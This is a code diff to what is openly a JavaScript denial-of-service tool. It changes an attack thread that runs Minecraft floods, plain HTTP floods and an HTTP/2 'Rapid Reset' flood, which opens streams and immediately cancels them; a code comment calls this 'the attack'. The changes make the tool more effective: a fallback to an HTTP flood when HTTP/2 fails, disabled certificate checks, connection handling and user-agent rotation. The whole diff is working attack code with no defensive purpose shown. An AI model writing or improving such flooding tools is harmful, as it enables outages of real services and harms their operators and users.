@@ -237,11 +237,23 @@ async function attackThread(config, endTime) {
     }
   }
   
+  // Check if target supports HTTP/2 on first request
+  let http2Supported = true;
+  
   while (isRunning && Date.now() < endTime) {
     if (isMinecraft) {
       sendMinecraftAttack(config, resolvedIP);
-    } else if (isHTTP2) {
-      await sendHTTP2RapidReset(config);
+    } else if (isHTTP2 && http2Supported) {
+      try {
+        await sendHTTP2RapidReset(config);
+      } catch (e) {
+        // Fallback to standard HTTP flood if HTTP/2 fails
+        if (e.code === 'ERR_SSL_BAD_EXTENSION' || e.message.includes('ALPN')) {
+          http2Supported = false;
+          log('⚠ Falling back to standard HTTP flood');
+          sendRequestNoWait(config, resolvedIP);
+        }
+      }
     } else {
       sendRequestNoWait(config, resolvedIP);
     }
@@ -400,31 +412,80 @@ async function sendHTTP2RapidReset(config) {
     
     let client = http2Sessions.get(sessionKey);
     
-    if (!client || client.destroyed) {
+    if (!client || client.destroyed || client.closed) {
+      // Create new HTTP/2 connection with proper ALPN
       client = http2.connect(url.origin, {
-        rejectUnauthorized: false
+        rejectUnauthorized: false,
+        settings: {
+          enablePush: false
+        }
       });
       
-      client.on('error', () => {
+      client.on('error', (err) => {
+        // Check if target doesn't support HTTP/2
+        if (err.code === 'ERR_SSL_BAD_EXTENSION' || err.code === 'ERR_HTTP2_ERROR') {
+          log(`⚠ Target doesn't support HTTP/2, falling back to HTTP/1.1`);
+          http2Sessions.delete(sessionKey);
+          stats.failed++;
+          return;
+        }
+        http2Sessions.delete(sessionKey);
+      });
+      
+      client.on('goaway', () => {
         http2Sessions.delete(sessionKey);
       });
       
       http2Sessions.set(sessionKey, client);
+      
+      // Wait for connection to be ready
+      await new Promise((resolve, reject) => {
+        const timeout = setTimeout(() => reject(new Error('Connection timeout')), 5000);
+        client.once('connect', () => {
+          clearTimeout(timeout);
+          resolve();
+        });
+        client.once('error', (err) => {
+          clearTimeout(timeout);
+          reject(err);
+        });
+      });
     }
     
     // Create stream and immediately reset it (Rapid Reset)
     const stream = client.request({
       ':method': config.method || 'GET',
       ':path': getAttackPath(config, url),
-      'user-agent': getRandomUserAgent()
+      ':scheme': url.protocol.replace(':', ''),
+      ':authority': url.hostname,
+      'user-agent': config.rotateUserAgent ? getRandomUserAgent() : currentUserAgent
     });
     
-    // Immediately send RST_STREAM to reset the request
-    stream.close(http2.constants.NGHTTP2_CANCEL);
+    // Handle stream errors
+    stream.on('error', (err) => {
+      if (err.code !== 'ERR_HTTP2_STREAM_CANCEL') {
+        stats.failed++;
+      }
+    });
     
-    stats.success++;
+    // Immediately send RST_STREAM to reset the request (this is the attack!)
+    setImmediate(() => {
+      try {
+        stream.close(http2.constants.NGHTTP2_CANCEL);
+        stats.success++;
+      } catch (e) {
+        stats.failed++;
+      }
+    });
     
   } catch (error) {
+    // If HTTP/2 fails completely, log once and stop using it
+    if (error.code === 'ERR_SSL_BAD_EXTENSION' || error.message.includes('ALPN')) {
+      if (!http2Sessions.has('_fallback_warned')) {
+        log('⚠ HTTP/2 not supported by target, use standard attack mode instead');
+        http2Sessions.set('_fallback_warned', true);
+      }
+    }
     stats.failed++;
   }
 }
